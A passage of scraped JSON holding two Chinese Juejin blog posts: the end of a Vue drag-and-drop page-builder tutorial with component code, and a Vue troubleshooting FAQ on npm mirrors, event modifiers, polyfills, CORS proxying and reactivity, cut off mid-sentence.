class=\"hljs-comment\">//这里我只写了组件的数据进来，布局的暂时没放</span>\n\t    <span class=\"hljs-keyword\">this</span>.dragData = DragApi.configList[<span class=\"hljs-number\">1</span>].content;\n\t}\n}\n\n</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n</code></pre><h4 class=\"heading\" data-id=\"heading-9\">-&gt; 来看看sort view视图区域组件</h4>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;template&gt;\n    &lt;Draggable :options=<span class=\"hljs-string\">\"sortOption\"</span>\n        @sort=<span class=\"hljs-string\">\"onSort\"</span>\n        @add=<span class=\"hljs-string\">\"onAdd\"</span>\n        class=<span class=\"hljs-string\">\"app-sort\"</span>&gt;\n        &lt;!-- ui组件 --&gt;\n        &lt;!--这里不懂的人，可以去vue官网看看动态组件--&gt;\n        &lt;div v-for=<span class=\"hljs-string\">\"(appUi,index) in sortApi\"</span> //循环组件\n             :is=<span class=\"hljs-string\">\"appUi.component\"</span> //根据存在的组件渲染出来\n             :content=<span class=\"hljs-string\">\"appUi.content\"</span>\n             :oStyle=<span class=\"hljs-string\">\"appUi.style\"</span>\n             :editPartShow=<span class=\"hljs-string\">\"appUi.editPartShow\"</span>\n             :aIndex=<span class=\"hljs-string\">\"index\"</span>\n             //组件想要点击生效，只需要@click.native就行了\n             @click.native=<span class=\"hljs-string\">\"getIndex(index)\"</span>\n             //key值一定要给出来，不然相同组件的排序可能会不成功\n             :key=<span class=\"hljs-string\">\"appUi.content.code\"</span>&gt;\n        &lt;/div&gt;\n    &lt;/Draggable&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    //利用vuex 辅助函数来操作vuexjs中的数据\n    import { mapState,mapMutations } from <span class=\"hljs-string\">'vuex'</span>;\n    //拖拽插件引入\n    import Draggable from <span class=\"hljs-string\">'vuedraggable'</span>;\n    //各个组件引入\n    import Carousel from <span class=\"hljs-string\">\"@/components/Carousel.vue\"</span>;\n    import Btn from <span class=\"hljs-string\">\"@/components/Btn.vue\"</span>;\n\n    <span class=\"hljs-built_in\">export</span> default {\n        name: <span class=\"hljs-string\">'Sort'</span>,\n        components: {\n            Draggable,Btn,Carousel\n        },\n        <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span>(){\n            <span class=\"hljs-built_in\">return</span> {\n                sortOption: {\n                    group: {\n                      name: <span class=\"hljs-string\">'components'</span>, //前面说的name,在这里就起了作用，不一样，是不能放入的\n                      pull: <span class=\"hljs-literal\">true</span>,\n                      put: <span class=\"hljs-literal\">true</span>\n                    },\n                    sort: <span class=\"hljs-literal\">true</span>,\n                    animation: 300 //给了个动画，看起来舒服些\n                }\n            }\n        },\n        computed:{\n            ...mapState([<span class=\"hljs-string\">'editIndex'</span>,<span class=\"hljs-string\">'sortApi'</span>]),\n        },\n        watch:{\n            sortApi:{\n                handler(newVal,oldVal){\n                    window.sessionStorage.setItem(<span class=\"hljs-string\">'localData'</span>,JSON.stringify(newVal));\n                },\n                deep: <span class=\"hljs-literal\">true</span>\n            }\n        },\n        methods:{\n            ...mapMutations([<span class=\"hljs-string\">'sortCp'</span>,<span class=\"hljs-string\">'addCp'</span>,<span class=\"hljs-string\">'setStyle'</span>,<span class=\"hljs-string\">'setCommon'</span>]),\n            onSort(res){ //排序产生的事件\n                <span class=\"hljs-keyword\">if</span>(res.from === res.to){\n                    this.sortCp(res);\n                }\n            },\n            onAdd(res){//组件增加产生的事件\n                this.addCp(res);\n            },\n            getIndex(index){\n               this.setCommon({index: index,flag: <span class=\"hljs-literal\">true</span>});\n            }\n        }\n    }\n&lt;/script&gt;\n</code></pre><h4 class=\"heading\" data-id=\"heading-10\">-&gt; 再来看看编辑组件</h4>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;template&gt;\n    &lt;transition name=<span class=\"hljs-string\">\"slide-right\"</span>&gt;\n        &lt;div v-if=<span class=\"hljs-string\">\"sortApi.length &gt; 0 &amp;&amp; editShow === true\"</span>&gt;\n            //组件特有编辑\n            &lt;el-tabs v-model=<span class=\"hljs-string\">\"activeName\"</span>&gt;\n                &lt;el-tab-pane label=<span class=\"hljs-string\">\"组件设置\"</span> name=<span class=\"hljs-string\">\"first\"</span>&gt;\n                    &lt;div v-for=<span class=\"hljs-string\">\"(appUi,index) in sortApi\"</span>\n                         :is=<span class=\"hljs-string\">\"appUi.component+'Edit'\"</span>\n                         :content=<span class=\"hljs-string\">\"appUi.content\"</span>\n                         :oStyle=<span class=\"hljs-string\">\"appUi.style\"</span>\n                         :editPartShow=<span class=\"hljs-string\">\"appUi.editPartShow\"</span>\n                         :aIndex=<span class=\"hljs-string\">\"index\"</span>\n                         :currentIndex=<span class=\"hljs-string\">\"editIndex\"</span>\n                         :key=<span class=\"hljs-string\">\"appUi.content.code\"</span>&gt;\n                    &lt;/div&gt;\n                &lt;/el-tab-pane&gt;\n                &lt;el-tab-pane label=<span class=\"hljs-string\">\"样式设置\"</span> name=<span class=\"hljs-string\">\"second\"</span>&gt;\n                    //公共样式编辑\n                    &lt;el-collapse v-model=<span class=\"hljs-string\">\"colorPicker.name\"</span> class=<span class=\"hljs-string\">\"base-edit\"</span>  accordion&gt;\n                        &lt;el-collapse-item class=<span class=\"hljs-string\">\"tititt\"</span> :title=<span class=\"hljs-string\">\"colorPicker.type\"</span> :name=<span class=\"hljs-string\">\"colorPicker.type\"</span>&gt;\n                            &lt;el-form ref=<span class=\"hljs-string\">\"form\"</span> :model=<span class=\"hljs-string\">\"colorPicker\"</span> size=<span class=\"hljs-string\">\"mini\"</span>&gt;\n                                &lt;el-form-item class=<span class=\"hljs-string\">\"cui-inline-reset\"</span>\n                                    v-for=<span class=\"hljs-string\">\"(item,index) in colorPicker.content\"</span>\n                                    :label=<span class=\"hljs-string\">\"item.title\"</span>\n                                    :key=<span class=\"hljs-string\">\"item.style\"</span>&gt;\n                                    &lt;el-color-picker\n                                        //在element-ui框架中，有很多@change @active-change事件，直接写事件发现不能传入参数，\n                                        //当然，办法总比问题多，我们换成一下这种写法就行了，他的默然参数写在前面\n                                        //这里颜色拾取器 返回的是实时的颜色值\n                                        //我这里主要想传一个对应的style\n                                        @active-change=<span class=\"hljs-string\">\" (value) =&gt; setStyle(value,item.style)\"</span>\n                                        v-model=<span class=\"hljs-string\">\"sortApi[editIndex].style[item.style]\"</span>\n                                        show-alpha&gt;\n                                    &lt;/el-color-picker&gt;\n                                    &lt;span class=<span class=\"hljs-string\">\"black-text-shadow\"</span>\n                                        :style=<span class=\"hljs-string\">\"{color: sortApi[editIndex].style[item.style]}\"</span>&gt;\n                                        {{ sortApi[editIndex].style[item.style] }}\n                                    &lt;/span&gt;\n                                &lt;/el-form-item&gt;\n                            &lt;/el-form&gt;\n                        &lt;/el-collapse-item&gt;\n                    &lt;/el-collapse&gt;\n                &lt;/el-tab-pane&gt;\n            &lt;/el-tabs&gt;\n        &lt;/div&gt;\n    &lt;/transition&gt;\n&lt;/template&gt;\n&lt;script&gt;\n    import { mapState,mapMutations } from <span class=\"hljs-string\">'vuex'</span>;\n    //这里我将组建特有的编辑栏，写成了一个组件，为什么不写在相应的组件一起了？\n    //这里必须说明一下，主要是我没有想到方法，让他在同一组件内分离出来，单独将dom结构放在编辑栏这里，如果有大神知道\n    //还望不吝赐教\n    import BtnEdit from <span class=\"hljs-string\">\"@/components/BtnEdit.vue\"</span>;\n    \n    <span class=\"hljs-built_in\">export</span> default{\n        name: <span class=\"hljs-string\">'BaseEdit'</span>,\n        components: {\n          BtnEdit\n        },\n        <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span>(){\n            <span class=\"hljs-built_in\">return</span>{\n                colorPicker: {\n                    <span class=\"hljs-built_in\">type</span>: <span class=\"hljs-string\">'颜色设置'</span>,\n                    name: <span class=\"hljs-string\">'Picker'</span>,\n                    content:[\n                        {\n                            title: <span class=\"hljs-string\">'背景颜色'</span>,\n                            style: <span class=\"hljs-string\">'background'</span>\n                        },\n                        {\n                            title: <span class=\"hljs-string\">'字体颜色'</span>,\n                            style: <span class=\"hljs-string\">'color'</span>\n                        }\n                    ]\n                    \n                },\n                activeName: <span class=\"hljs-string\">'first'</span>\n            }\n        },\n        \n        computed:{\n            ...mapState([<span class=\"hljs-string\">'editIndex'</span>,<span class=\"hljs-string\">'sortApi'</span>,<span class=\"hljs-string\">'editShow'</span>])\n        },\n        methods:{\n            <span class=\"hljs-built_in\">set</span>Style(value,style){\n                //根据上面传入的style属性，实时改变现有的值\n                this.<span class=\"hljs-variable\">$set</span>(this.sortApi[this.editIndex].style,style,value);\n            }\n        }\n    }\n&lt;/script&gt;\n</code></pre><h4 class=\"heading\" data-id=\"heading-11\">-&gt; 选出一个组件来看看里面是怎么配置的</h4>\n<pre><code class=\"hljs html\" lang=\"html\">//按钮组件，其实里面很简单\n//组件的对应的编辑组件，里面内容和这个也差不多，下面就不写了\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">template</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"btn-box ui-sortable\"</span> <span class=\"hljs-attr\">:data-code</span>=<span class=\"hljs-string\">\"content.code\"</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">el-button</span> <span class=\"hljs-attr\">class</span>=<span class=\"hljs-string\">\"ui-btn\"</span>\n            <span class=\"hljs-attr\">:style</span>=<span class=\"hljs-string\">\"oStyle\"</span>&gt;</span>\n            {{ content.text }}\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">el-button</span>&gt;</span>\n        //因为每个组件都有删除功能，所以写成了一个组件\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">DeleteCp</span> <span class=\"hljs-attr\">:aIndex</span>=<span class=\"hljs-string\">\"aIndex\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">DeleteCp</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">template</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\">\n    <span class=\"hljs-keyword\">import</span> DeleteCp <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">\"@/components/DeleteCp\"</span>;\n    <span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n        <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'Btn'</span>,\n        <span class=\"hljs-attr\">props</span>: { <span class=\"hljs-comment\">//父组件传入的参数</span>\n            content: <span class=\"hljs-built_in\">Object</span>,\n            <span class=\"hljs-attr\">oStyle</span>: <span class=\"hljs-built_in\">Object</span>,\n            <span class=\"hljs-attr\">aIndex</span>: <span class=\"hljs-built_in\">Number</span>\n        },\n        <span class=\"hljs-attr\">components</span>: {\n            DeleteCp\n        },\n        data(){\n            <span class=\"hljs-keyword\">return</span>{\n                <span class=\"hljs-attr\">btnModel</span>: <span class=\"hljs-string\">'btn-model'</span>\n            }\n        }\n    }\n</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n\n</code></pre><h4 class=\"heading\" data-id=\"heading-12\">-&gt;最后来看看删除组件吧</h4>\n<pre><code class=\"hljs bash\" lang=\"bash\">&lt;template&gt;\n    &lt;div class=<span class=\"hljs-string\">\"delete-compontent-box\"</span>&gt;\n        &lt;div class=<span class=\"hljs-string\">\"el-icon-delete remove-component\"</span> @click.stop=<span class=\"hljs-string\">\"dailogStatu\"</span>&gt;&lt;/div&gt;\n        &lt;el-dialog\n            title=<span class=\"hljs-string\">\"提示\"</span>\n            :visible.sync=<span class=\"hljs-string\">\"dialogVisible\"</span>\n            :append-to-body=<span class=\"hljs-string\">\"appendToBody\"</span>\n            width=<span class=\"hljs-string\">\"430px\"</span>&gt;\n            &lt;div class=<span class=\"hljs-string\">\"el-message-box__content\"</span>&gt;\n                &lt;div class=<span class=\"hljs-string\">\"el-message-box__status el-icon-warning\"</span>&gt;&lt;/div&gt;\n                &lt;div class=<span class=\"hljs-string\">\"el-message-box__message dialog-message\"</span>&gt;此操作将删除该模块, 是否继续?&lt;/div&gt;\n            &lt;/div&gt;\n            &lt;span slot=<span class=\"hljs-string\">\"footer\"</span> class=<span class=\"hljs-string\">\"dialog-footer\"</span>&gt;\n                &lt;el-button @click=<span class=\"hljs-string\">\"dialogVisible = false\"</span> size=<span class=\"hljs-string\">\"small\"</span>&gt;取 消&lt;/el-button&gt;\n                &lt;el-button <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">\"primary\"</span> @click=<span class=\"hljs-string\">\"onRemove(aIndex)\"</span> size=<span class=\"hljs-string\">\"small\"</span>&gt;确 定&lt;/el-button&gt;\n            &lt;/span&gt;\n        &lt;/el-dialog&gt;\n    &lt;/div&gt;\n&lt;/template&gt;\n\n&lt;script&gt;\n    import { mapMutations } from <span class=\"hljs-string\">\"vuex\"</span>;\n    <span class=\"hljs-built_in\">export</span> default {\n        name: <span class=\"hljs-string\">'oText'</span>,\n        props: {\n            aIndex: Number\n        },\n        <span class=\"hljs-function\"><span class=\"hljs-title\">data</span></span>(){\n            <span class=\"hljs-built_in\">return</span>{\n                //这两个参数是弹框的参数\n                dialogVisible: <span class=\"hljs-literal\">false</span>,\n                appendToBody: <span class=\"hljs-literal\">true</span> \n            }\n        },\n        methods:{\n            ...mapMutations([<span class=\"hljs-string\">'deleteCp'</span>,<span class=\"hljs-string\">'setCommon'</span>]),\n            <span class=\"hljs-function\"><span class=\"hljs-title\">dailogStatu</span></span>(){\n            //主要是控制弹窗出来，并且显示该组件对应的编辑栏\n              this.dialogVisible = <span class=\"hljs-literal\">true</span>;\n              this.setCommon({flag: <span class=\"hljs-literal\">true</span>,index: this.aIndex})\n            },\n            onRemove(index){\n                //点击确定删除对应的组件\n                <span class=\"hljs-built_in\">let</span> flag = <span class=\"hljs-literal\">false</span>;\n                this.deleteCp(index);\n                this.dialogVisible = <span class=\"hljs-literal\">false</span>;\n                this.<span class=\"hljs-variable\">$message</span>({\n                    message: <span class=\"hljs-string\">'该模块已删除 !'</span>,\n                    <span class=\"hljs-built_in\">type</span>: <span class=\"hljs-string\">'success'</span>\n                });\n                this.setCommon({flag: <span class=\"hljs-literal\">false</span>,index: 0})\n            }\n        }\n    }\n&lt;/script&gt;\n</code></pre><hr>\n<h4 class=\"heading\" data-id=\"heading-13\">-&gt; 来看看效果图吧</h4>\n<p></p><figure><img alt=\"效果图展示\" class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/1/31/1614b081bf7378d8?imageslim\" data-width=\"919\" data-height=\"608\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;919&quot; height=&quot;608&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-14\">结束语</h2>\n<p>好了，今天写了很多了，最后我们来梳理一下思路：</p>\n<p>1、首先配置左侧的拖拽组件<br>\n2、配置vuex中的数据<br>\n3、app.vue中配置<br>\n4、编辑组件的配置<br>\n5、各种数据的传递与依赖</p>\n<p>其实每个项目，都需要一个清晰的路线，这样才能很好的开发下去，所以我的建议是，在拿到项目的时候，千万不要一股脑的去写，一定要想好怎么做，以及突发事情的发生(比如突来的需求变更)，这样既方便了我们自己，也方便了后来维护的人，也阻止了不必要的麻烦</p>\n<p>谢谢大家的耐心的阅读，毕竟这只是一个大概的介绍，肯定存在很多不足，如果大家有建议，欢迎留言交流</p>\n<p>最后：欢迎大家关注我的个人公众号：<strong>大前端js</strong>，当然为了回馈大家关注，里面我放了一些学习资源，热烈欢迎大家关注交流前端方面但不局限前端方面的知识；</p>\n<blockquote>\n<p><strong>原创不易，转载时请注明出处与原文链接，谢谢！</strong></p>\n</blockquote>\n</div>"},{"title":"Vue 脱坑记 - 查漏补缺(汇总下群里高频询问的xxx及给出不靠谱的解决方案)","avatar":"https://user-gold-cdn.xitu.io/2018/1/26/16131f8dea4459b4?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"CRPER","create_time":"2017 年 11 月 07 日","tags":["Vue.js","JavaScript","前端","Vuex","vue-router"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h1 class=\"heading\" data-id=\"heading-0\">前言</h1><p>文章内容覆盖范围,<code>芝麻绿豆</code>的破问题都有,不止于<code>vue</code>;<br>给出的是方案,但不是手把手一字一句的给你说十万个为什么!</p>\n<p>有三类人不适合此篇文章:</p>\n<ul>\n<li>\"喜欢站在道德制高点的圣母婊\" -- 适合去教堂</li>\n<li>\"无理取闹的键盘侠\" -- 国际新闻版块欢迎你去</li>\n<li>\"有一定基础但又喜欢逼逼的人\"<ul>\n<li>得得得,老子知道你厉害了,你好牛逼,这些问题那么简单,都是小白看的</li>\n<li>这种傻瓜文,简直浪费老子的时间!</li>\n</ul>\n</li>\n</ul>\n<p>对于以上三类人,走吧,这里不是你来装逼的地方.<br>你们也不值得看老子花那么多时间去汇总的水文.</p>\n<p>学习一些新东西.若是有人给汇总那么多问题(指明方向和一定的解决法子).<br>不用让我去各种搜索,汇总,总结,学习时间起码可以节省一半!</p>\n<hr>\n<h1 class=\"heading\" data-id=\"heading-1\">问题汇总</h1><h2 class=\"heading\" data-id=\"heading-2\">Q:安装超时(<code>install timeout</code>)</h2><p>方案有这么些:</p>\n<ul>\n<li><strong><code>cnpm</code> : 国内对npm的镜像版本</strong></li>\n</ul>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\"><span class=\"hljs-comment\">/*\ncnpm website: https://npm.taobao.org/\n*/</span>\n\nnpm install -g cnpm --registry=https:<span class=\"hljs-comment\">//registry.npm.taobao.org</span>\n\n\n<span class=\"hljs-comment\">// cnpm 的大多命令跟 npm 的是一致的,比如安装,卸载这些</span></code></pre><ul>\n<li><p><strong><code>yarn</code> 和 <code>npm</code> 改源大法</strong></p>\n<ul>\n<li>使用 nrm 模块 : <a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fnrm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">www.npmjs.com/package/nrm</a></li>\n<li>npm config : <code>npm config set registry https://registry.npm.taobao.org</code></li>\n<li>yarn config : <code>yarn config set registry https://registry.npm.taobao.org</code></li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-3\">Q:安装一些需要编译的包:提示没有安装<code>python</code>、build失败等</h2><p>因为一些 <code>npm</code> 的包安装需要编译的环境,<code>mac</code> 和 <code>linux</code> 都还好,大多都齐全<br>window 用户依赖 <code>visual studio 的一些库</code>和<code>python 2+</code>,</p>\n<p>windows的小伙伴都装上: </p>\n<ul>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Ffelixrieseberg%2Fwindows-build-tools\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">windows-build-tools</a></li>\n<li><a href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.python.org%2Fdownloads%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">python 2.x</a></li>\n</ul>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-4\">Q:<code>can't not find 'xxModule'</code> - 找不到某些依赖或者模块</h2><p>这种情况一般报错信息可以看到是哪个包抛出的信息.<br>一般卸载这个模块,安装重新安装下即可.</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-5\">Q:<code>data functions should return an object</code></h2><p>这个问题是 Vue 实例内,单组件的<code>data</code>必须返回一个对象;如下</p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\"><span class=\"hljs-keyword\">export</span> <span class=\"hljs-keyword\">default</span> {\n  <span class=\"hljs-attr\">name</span>: <span class=\"hljs-string\">'page-router-view'</span>,\n      data () {\n      <span class=\"hljs-keyword\">return</span> {\n        <span class=\"hljs-attr\">tabs</span>: [\n          {\n            <span class=\"hljs-attr\">title</span>: <span class=\"hljs-string\">'财务信息'</span>,\n            <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">'/userinfo'</span>\n          },\n          {\n            <span class=\"hljs-attr\">title</span>: <span class=\"hljs-string\">'帐号信息'</span>,\n            <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">'/userinfo/base'</span>\n          }\n        ]\n      }\n    }\n}</code></pre><p><strong>为什么要 return 一个数据对象呢?</strong></p>\n<p>官方解释如下:  data 必须声明为返回一个初始数据对象的函数，因为组件可能被用来创建多个实例。如果 data 仍然是一个纯粹的对象，则所有的实例将共享引用同一个数据对象！</p>\n<p>简言之,组件复用下,不会造成数据同时指向一处,造出牵一发而动全身的破问题...</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-6\">Q:我给组件内的原生控件添加事件,怎么不生效了!!!</h2><pre><code class=\"hljs html\" lang=\"html\">\n<span class=\"hljs-comment\">&lt;!--比如用了第三方框架,或者一些封装的内置组件; 然后想绑定事件--&gt;</span>\n\n<span class=\"hljs-comment\">&lt;!--// 错误例子1--&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">el-input</span> <span class=\"hljs-attr\">placeholder</span>=<span class=\"hljs-string\">\"请输入特定消费金额 \"</span> @<span class=\"hljs-attr\">mouseover</span>=<span class=\"hljs-string\">\"test()\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">el-input</span>&gt;</span>\n\n\n<span class=\"hljs-comment\">&lt;!--// 错误例子2--&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">router-link</span> <span class=\"hljs-attr\">:to</span>=<span class=\"hljs-string\">\"item.menuUrl\"</span> @<span class=\"hljs-attr\">click</span>=<span class=\"hljs-string\">\"toggleName=''\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">i</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">\"['fzicon',item.menuIcon]\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">i</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span>&gt;</span>{{item.menuName}}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">router-link</span>&gt;</span>\n\n\n<span class=\"hljs-comment\">&lt;!--上面的两个例子都没法触发事件!!!--&gt;</span>\n<span class=\"hljs-comment\">&lt;!--究其原因,少了一个修饰符 .native--&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">router-link</span> <span class=\"hljs-attr\">:to</span>=<span class=\"hljs-string\">\"item.menuUrl\"</span> @<span class=\"hljs-attr\">click.native</span>=<span class=\"hljs-string\">\"toggleName=''\"</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">i</span> <span class=\"hljs-attr\">:class</span>=<span class=\"hljs-string\">\"['fzicon',item.menuIcon]\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">i</span>&gt;</span>\n  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span>&gt;</span>{{item.menuName}}<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">router-link</span>&gt;</span>\n\n<span class=\"hljs-comment\">&lt;!--明明官方文档有的,一堆人不愿意去看,,Fuck--&gt;</span>\n<span class=\"hljs-comment\">&lt;!--https://cn.vuejs.org/v2/guide/components.html#给组件绑定原生事件--&gt;</span></code></pre><hr>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-7\">Q:我用了 <code>axios</code> , 为什么 IE 浏览器不识别(IE9+)</h2><p>那是因为 IE 整个家族都不支持 promise, 解决方案:</p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\">\nnpm install es6-promise\n\n<span class=\"hljs-comment\">// 在 main.js 引入即可</span>\n<span class=\"hljs-comment\">// ES6的polyfill</span>\n<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">\"es6-promise\"</span>).polyfill();</code></pre><hr>\n<h2 class=\"heading\" data-id=\"heading-8\">Q:我在函数内用了<code>this.xxx=</code>,为什么抛出<code>Cannot set property 'xxx' of undefined;</code></h2><p>这又是<code>this</code>的套路了..<code>this</code>是和当前运行的上下文绑定的...</p>\n<p>一般你在<code>axios</code>或者其他 <code>promise</code> , 或者<code>setInterval</code> 这些默认都是指向最外层的全局钩子.</p>\n<p>简单点说:\"最外层的上下文就是 <code>window</code>,vue内则是 Vue 对象而不是实例!\";</p>\n<p>解决方案:</p>\n<ul>\n<li>暂存法: 函数内先缓存 <code>this</code> , let that = this;(let是 es6, es5用 var)</li>\n<li>箭头函数: 会强行关联当前运行区域为 this 的上下文;</li>\n</ul>\n<p><code>this</code>的知识, 读\"&lt;&lt;你不知道的 JS 系列&gt;&gt;\"最为合适了,里面讲的很清楚</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-9\">Q:我看一些Vue教程有这么些写法,是什么意思<code>@click.prevent</code>,<code>v-demo.a.b</code>;</h2><p>就拿这两个例子来说吧.</p>\n<ul>\n<li><code>@click.prevent</code> : 事件+修饰符 , 作用就是点击但又阻止默认行为</li>\n<li><code>v-demo.a.b</code>: 自定义指令+修饰符. 具体看你什么指令了,修饰符的作用大多是给事件增加一些确切的拓展功能</li>\n</ul>\n<p>比如阻止事件冒泡,阻止默认行为,访问到原生控件,结合键盘快捷键等等</p>\n<p>传送门:<a href=\"https://link.juejin.im?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fguide%2Fevents.html%23%E4%BA%8B%E4%BB%B6%E4%BF%AE%E9%A5%B0%E7%AC%A6\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">事件修饰符</a>;</p>\n<p>可以自定义修饰符么?也是可以的..</p>\n<p>可以通过全局 <code>config.keyCodes</code> 对象自定义键值修饰符别名：</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-10\">Q:为什么我的引入的小图片渲染出来却是 <code>data:image/png;base64xxxxxxxx</code></h2><p>这个是 webpack 里面的对应插件处理的.</p>\n<p>对于小于多少 K 以下的图片(规定的格式)直接转为 base64格式渲染;</p>\n<p>具体配置在<code>webpack.base.conf.js</code>里面的 rules里面的 <code>url-loader</code></p>\n<p>这样做的好处:在网速不好的时候先于内容加载和减少http的请求次数来减少网站服务器的负担。</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-11\">Q:<code>Component template shold contain exactly one root element.If you are useing  v-if on multiple elements , xxxxx</code></h2><p>大体就是说,单组件渲染 DOM 区域必须要有一个根元素,不能出现同级元素.<br>可以用<code>v-if</code>和<code>v-else-if</code>指令来控制其他元素达到并存的状态</p>\n<p>换个直白的解释,就是有一个唯一的父类,包裹者;</p>\n<p><strong>比如一个 div(父包含块) 内部多少个同级或者嵌套都行,但是最外层元素不能出现同级元素!!!!\n</strong></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-12\">Q:跨域问题怎么破!比如<code>No 'Access-Control-Allow-Origin' header is present on the requested resource.</code></h2><p>这种问题老生常谈了,我就不细说了..大体说一下;</p>\n<p>1: <code>CORS</code> , 前后端都要对应去配置,IE10+<br>2: <code>nginx</code> 反向代理,一劳永逸  &lt;-- 线上环境可以用这个</p>\n<p>线下开发模式,比如你用了<code>vue-cli</code>, 里面的 webpack 有引入了<code>proxyTable</code>这么个玩意,<br>也可以做接口反向代理</p>\n<pre><code class=\"hljs javascript\" lang=\"JavaScript\"><span class=\"hljs-comment\">// 在 config 目录下的index.js</span>\n\nproxyTable: {\n  <span class=\"hljs-string\">\"/bp-api\"</span>: {\n    <span class=\"hljs-attr\">target</span>: <span class=\"hljs-string\">\"http://new.d.st.cn\"</span>,\n    <span class=\"hljs-attr\">changeOrigin</span>: <span class=\"hljs-literal\">true</span>,\n    <span class=\"hljs-comment\">// pathRewrite: {</span>\n    <span class=\"hljs-comment\">//   \"^/bp-api\": \"/\"</span>\n    <span class=\"hljs-comment\">// }</span>\n  }\n}\n\n<span class=\"hljs-comment\">// target : 就是 api 的代理的实际路径</span>\n<span class=\"hljs-comment\">// changeOrigin: 就是是变源,必须是...</span>\n<span class=\"hljs-comment\">// pathRewrite : 就是路径重定向,一看就知道</span></code></pre><p>当然还有依旧坚挺的<code>jsonp</code>大法!不过局限性比较多,比较适合一些<strong>特殊</strong>的信息获取!</p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-13\">Q:我需要遍历的数组值更新了,值也赋值了,为什么视图不更新!!!</h2><p>那是因为有局限性啊,官方文档也说的很清楚,只有一些魔改的之后的方法提供跟原生一样的使用姿势(却又可以触发视图更新);</p>\n<p>一般我们更常用(除了魔改方法)的手段是使用:<code>this.$set(obj,item,value)</code>;</p>\n<p>传送门:<a href=\"https://link.juejin.im?target=https%3A%2F%2Fcn.vuejs.org%2Fv2%2Fguide%2Flist.html%23%E6%95%B0%E7%BB%84%E6%9B%B4%E6%96%B0%E6%A3%80%E6%B5%8B\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">数组更新检测(触发视图更新)</a></p>\n<hr>\n<h2 class=\"heading\" data-id=\"heading-14\">Q:为什么我的组件间的样式不能继承或者覆写啊!!!</h2><p>单组件开发模式下,请确认是否开启了 <code>CSS</code>模块化功能!!</p>\n<p>也就是<code>scoped</code>(vue-cli 